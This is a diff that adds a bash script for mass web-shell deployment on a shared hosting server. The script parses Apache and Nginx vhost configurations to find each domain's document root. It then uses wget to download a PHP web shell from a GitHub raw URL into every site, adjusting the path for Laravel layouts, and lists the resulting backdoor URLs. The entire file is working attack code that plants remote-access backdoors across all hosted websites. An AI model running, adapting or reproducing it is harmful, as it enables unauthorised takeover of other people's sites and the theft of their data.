@@ -1,0 +1,147 @@
+#!/bin/bash
+
+SHELL_URL="https://raw.githubusercontent.com/freyarion25/Kyy-Shell/refs/heads/main/shell-sah-man.txt"
+SHELL_NAME="sah-man.php"
+
+# Function to extract domain from vhost config file
+extract_domain() {
+    local config_file="$1"
+    local domain=""
+    
+    if [ -f "$config_file" ]; then
+        # Apache format
+        domain=$(grep -i "^[[:space:]]*ServerName" "$config_file" | head -1 | awk '{print $2}')
+        
+        # Nginx format
+        if [ -z "$domain" ]; then
+            domain=$(grep -i "^[[:space:]]*server_name" "$config_file" | head -1 | sed 's/.*server_name//' | awk '{print $1}' | tr -d ';')
+        fi
+        
+        # Fallback: filename
+        if [ -z "$domain" ]; then
+            domain=$(basename "$config_file" | sed 's/\.conf$//' | sed 's/\.ssl$//')
+        fi
+    fi
+    
+    echo "$domain"
+}
+
+# Collect all domains from vhost configurations
+declare -A domains_map
+declare -a domains_list
+
+# Check Apache vhosts
+if [ -d "/usr/local/apache/conf.d/vhosts/" ]; then
+    for config in /usr/local/apache/conf.d/vhosts/*.conf; do
+        if [ -f "$config" ]; then
+            domain=$(extract_domain "$config")
+            if [ -n "$domain" ]; then
+                domains_map["$domain"]="$config"
+                domains_list+=("$domain")
+            fi
+        fi
+    done
+fi
+
+# Check Nginx vhosts
+if [ -d "/etc/nginx/conf.d/vhosts/" ]; then
+    for config in /etc/nginx/conf.d/vhosts/*.conf; do
+        if [ -f "$config" ]; then
+            domain=$(extract_domain "$config")
+            if [ -n "$domain" ] && [ -z "${domains_map[$domain]}" ]; then
+                domains_map["$domain"]="$config"
+                domains_list+=("$domain")
+            fi
+        fi
+    done
+fi
+
+# If no domains found, exit
+if [ ${#domains_list[@]} -eq 0 ]; then
+    echo "[-] No domains found in vhost configurations"
+    exit 1
+fi
+
+echo "[*] Found ${#domains_list[@]} domains"
+echo "[*] Shell URL : $SHELL_URL"
+echo "[*] Shell Name: $SHELL_NAME"
+echo "----------------------------------------"
+
+SUCCESS=()
+FAILED=()
+
+# Deploy to each domain
+for domain in "${domains_list[@]}"; do
+    config_file="${domains_map[$domain]}"
+    doc_root=""
+
+    # Extract DocumentRoot / root
+    if [ -f "$config_file" ]; then
+        doc_root=$(grep -i "^[[:space:]]*DocumentRoot" "$config_file" | head -1 | awk '{print $2}' | tr -d '"')
+        if [ -z "$doc_root" ]; then
+            doc_root=$(grep -i "^[[:space:]]*root" "$config_file" | head -1 | sed 's/.*root//' | awk '{print $1}' | tr -d ';')
+        fi
+    fi
+
+    # Fallback: /home/*/public_html
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        for user_dir in /home/*/; do
+            if [ -d "${user_dir}public_html" ]; then
+                doc_root="${user_dir}public_html"
+                break
+            fi
+        done
+    fi
+
+    # Fallback: username dari domain
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        username=$(echo "$domain" | cut -d'.' -f1)
+        if [ -d "/home/$username/public_html" ]; then
+            doc_root="/home/$username/public_html"
+        fi
+    fi
+
+    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
+        echo "[-] $domain → doc root not found"
+        FAILED+=("$domain")
+        continue
+    fi
+
+    # Detect Laravel
+    if [ -d "${doc_root}/storage" ] && [ -d "${doc_root}/public" ]; then
+        deploy_path="${doc_root}/public/${SHELL_NAME}"
+    else
+        deploy_path="${doc_root}/${SHELL_NAME}"
+    fi
+
+    # Deploy shell via wget
+    wget -q --no-check-certificate -O "$deploy_path" "$SHELL_URL" 2>/dev/null
+
+    if [ $? -eq 0 ] && [ -f "$deploy_path" ]; then
+        echo "[+] $domain → deployed"
+        echo "    URL: https://${domain}/${SHELL_NAME}"
+        SUCCESS+=("https://${domain}/${SHELL_NAME}")
+    else
+        echo "[-] $domain → wget failed (doc_root: $doc_root)"
+        FAILED+=("$domain")
+    fi
+done
+
+echo "----------------------------------------"
+echo "[*] Done: ${#SUCCESS[@]} success, ${#FAILED[@]} failed"
+echo ""
+
+if [ ${#SUCCESS[@]} -gt 0 ]; then
+    echo "[+] Shell URLs:"
+    for url in "${SUCCESS[@]}"; do
+        echo "    $url"
+    done
+fi
+
+if [ ${#FAILED[@]} -gt 0 ]; then
+    echo ""
+    echo "[-] Failed domains:"
+    for d in "${FAILED[@]}"; do
+        echo "    $d"
+    done
+fi
